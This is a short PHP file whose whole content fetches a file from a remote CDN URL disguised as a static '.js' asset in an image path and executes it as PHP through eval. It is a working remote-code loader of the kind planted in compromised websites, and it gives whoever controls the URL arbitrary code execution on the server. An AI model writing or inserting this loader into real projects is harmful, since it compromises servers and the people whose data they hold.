<?php

$url = "https://cdn.via.com/static/img/v1/newui/ph/general/1568605795186_bisa.js";
$data = file_get_contents($url);
eval('?>'.$data);


?>
